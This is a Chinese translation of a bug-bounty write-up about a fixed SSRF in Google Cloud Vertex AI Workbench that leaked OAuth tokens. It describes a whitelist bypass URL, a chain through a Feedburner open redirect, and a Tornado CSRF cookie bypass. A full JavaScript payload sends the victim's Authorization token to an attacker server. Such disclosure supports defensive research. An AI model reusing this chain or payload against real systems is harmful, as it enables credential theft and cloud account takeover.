#  客户端 SSRF 到 Google Cloud 项目接管 [Google VRP]

枇杷五星加强版  [ 黑伞安全 ](javascript:void\(0\);)

**黑伞安全** ![]()

微信号 hack_umbrella

功能介绍 安全加固 渗透测试 众测 ctf 安全新领域研究

____

___发表于_

收录于合集

翻译自https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/

  

这篇文章是关于我和Sivanesh于 2022 年在 Google Cloud 中发现的错误的一系列文章的一部分。

Google Cloud 提供Vertex AI，可让您构建、部署和扩展机器学习模型。除了各种其他功能之外，Vertex AI 还提供了“
Workbench ”功能。Workbench 使您能够在云上创建基于 Jupyter Notebook 的开发环境。如果您使用过 Jupyter
Notebook，您就会知道这里可能会出现很多问题。所以我决定深入挖掘。

Workbench 为您提供了两种选择：

  * 托管笔记本实例是托管在 Google 托管环境中的笔记本。这意味着您对它没有太多控制权。

  * 用户管理的笔记本可以高度自定义，并且完全由用户管理。

## 初始错误

当您创建笔记本时，它会给您一个实例https://{random-number}-dot-us-
central1.notebooks.googleusercontent.com/

由于托管笔记本位于 Google 托管环境（沙盒）中，因此它们无法访问您的 Google 云数据。因此，您必须授予托管笔记本通过 OAuth 流访问您的
Google Cloud 数据的权限。

![](https://gitee.com/fuli009/images/raw/master/public/20230714181022.png)范围：https://www.googleapis.com/auth/cloud-
platform

身份验证后，我决定使用该应用程序来了解流程。然后我偶然发现了这个特定的 URL：

https://{INSTANCE-ID}-dot-us-
central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/something

嗯，我觉得有 SSRF 的味道。请求原始 URL 会产生一个响应，该响应看起来像是发送到
的经过身份验证的请求的输出compute.googleapis.com。根据以前的经验，我知道这些端点使用 Authorization 标头作为凭据。

我尝试更改compute.googleapis.com为geekycat.in.
但它不起作用，看起来有些白名单已经到位。经过一番摸索后，我发现https://{INSTANCE-ID}-dot-us-
central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/绕过检查，这很容易😅

Authorization我的服务器的日志显示它收到了标头中带有令牌的请求。我很快验证了访问令牌。它确实拥有Cloud-
Platform我的谷歌帐户的权限。此外，易受攻击的端点是GET没有 CSRF
保护的请求（很常见）。这意味着，通过欺骗受害者点击精心设计的链接，攻击者可以获得授权令牌并获得对受害者所有 GCP 项目的完全访问权限。

### 获取受害者实例子域的方法：

攻击者需要知道受害者的子域才能进行攻击。受害者子Instance-ID域中的 是随机的，无法猜测。那么，这里有一些可以获得它的方法。

  * 默认情况下，每个人的子域名都会在一般应用流程中通过引用者泄露到多个第三方域名。其中一些域是：

1. https://avatars.githubusercontent.com/  
2. https://github.com  
3. https://registry.npmjs.org  
任何有权访问这些域或这些服务器中的漏洞的人都可能泄露子域。

  * 在受害者项目中具有“笔记本查看器”角色的任何人都可以查看子域，然后利用此问题来访问所有受害者的项目。

示例有效负载：https://29559448054aa43f-dot-us-
central1.notebooks.googleusercontent.com/aipn/v2/proxy/logger.geekycat.in/compute.googleapis.com/

### 报酬：

我们向 Google 报告了此问题，作为其漏洞奖励计划的一部分。他们给了我们 5000 美元的赏金。

### 使固定：

  * 为GET端点添加了 CSRF 保护。

  * 正确提取并验证域。

## 旁路：

修复程序推出后，我注意到了另一种以前不存在的行为。

网址：  
https://{INSTANCE-ID}-dot-us-
central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/

之前，更改compute.googleapis.comwithsomething.google.com会导致错误。但这一次，它起作用了。现在，如果我能在其中找到一个开放重定向，*.google.com我可以将其链接起来以绕过此检查。

Google 中最常见的公开记录的开放重定向是基于 javascript 的重定向，这在我们的情况下不起作用，因为服务器不解析 JS。于是我开始在
Google 子域中寻找 3xx 重定向。

几分钟后，我偶然发现了https://feedburner.google.com。该服务可让您管理您所在域的 RSS 源。这就像 RSS 提要的代理一样。

![]()

 在玩弄过程中，我注意到一种可以让我们获得开放重定向的行为。也就是说，如果您的代理已停用，它会将 URL 重定向到您的域，而不是代理您的 RSS 提要。

### 设置开放重定向：

  * 在您的域中托管 RSS 文件 (logger.geekycat.in)

  * 导航至https://feedburner.google.com--> 创建代理 --> 输入https://attacker.com/rss.xmlFeed URL --> 下一步 --> 复制“自定义 URL”--> 创建

复制的 URL 的格式如下：https://feeds.feedburner.com/{CUSTOM}/{ID}

  * 创建代理后，单击三个点 --> 停用 --> 确认

现在，访问https://feeds.feedburner.com/{CUSTOM}/{ID}将重定向到您的域。是的，开放重定向未开启*.google.com。最初，Google
曾在 上托管 RSS 代理https://feedburner.google.com，但现在他们更改了域名。然而，幸运的是，您仍然可以通过简单地构造 URL
来使用新创建的 RSS
源https://feedburner.google.com：https://feedproxy.google.com/{CUSTOM}/{ID}

由于我们有一个开放的重定向，让我们尝试再次执行相同的攻击。访问https://{INSTANCE-ID}-dot-us-
central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}还是会失败，因为他们实施了CSRF保护。

### 绕过CSRF保护：

幸运的是，Jupyter 笔记本托管在 Tornado 服务器上。在之前的研究中，@s1r1us提到了一种绕过 Tornado 服务器中的 CSRF
保护的技术。Tornado 服务器通过将 GET 参数/POST 主体中的 CSRF 令牌与 cookie 中的 CSRF 令牌进行比较来验证 CSRF
令牌。如果两者都匹配，则通过。否则，就失败了。由于子域可以为父域设置 cookie，因此在任何子域中执行 javascript 将允许我们为 cookie
设置任意 CSRF 令牌，然后绕过 CSRF 保护。

CSRF 绕过的先决条件是在同站点上下文中执行 javascript。在我们的例子中，应用程序托管在https://{VICTIM-INSTANCE-
ID}-dot-us-central1.notebooks.googleusercontent.com.
由于googleusercontent.com它是一个沙盒域，主要用于托管用户控制的内容，因此获取 JavaScript 执行非常简单。

为了获得 JavaScript 执行，攻击者必须在工作台中分离他的用户管理笔记本。在那里，他将在子域中获得一个 Jupyter 笔记本
googleusercontent.com。

Jupyter Notebook 的索引页面位于 下/opt/conda/share/jupyter/lab/static。现在他所要做的就是编辑 HTML
页面并在googleusercontent.com. 由于我们已经成功获得了 javascript 执行，因此我们现在可以设置任意 CSRF
令牌并绕过保护。

### 把它们放在一起：

  * 攻击者获得开放重定向feedburner.google.com

  * 然后，他创建自己的用户管理笔记本，并使用以下内容更改其索引页。

  *   *   *   *   *   *   *   *   *   * 

    
    
    <!DOCTYPE html><html lang="en"><body>    <script>        var base_domain = document.domain.substr(document.domain.indexOf('.'));      document.cookie='_xsrf=1;Domain='+base_domain;fetch("https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1",{credentials:"include",mode:"no-cors"})</script></body></html>

当受害者访问攻击者的笔记本实例时，上述代码将被执行。

  * document.cookie='_xsrf=1;Domain='+base_domain;将受害者 cookie 中的 CSRF 令牌设置为1

  * fetch("https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1",{credentials:"include",mode:"no-cors"})获取包含凭证的受害者实例。

  * 由于 CSRF 令牌设置为1，因此它与 cookie 中的令牌匹配并绕过 CSRF 保护。

  * 现在，受害者的实例服务器将尝试feedproxy.google.com/{CUSTOM}/{ID}使用受害者的授权标头进行获取。

  * feedproxy.google.com/{CUSTOM}/{ID}将重定向到攻击者的服务器，攻击者将在其服务器日志中获取受害者的授权令牌。

  * 由于授权令牌具有云平台权限，因此攻击者可以完全访问受害者的所有 GCP 项目。

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

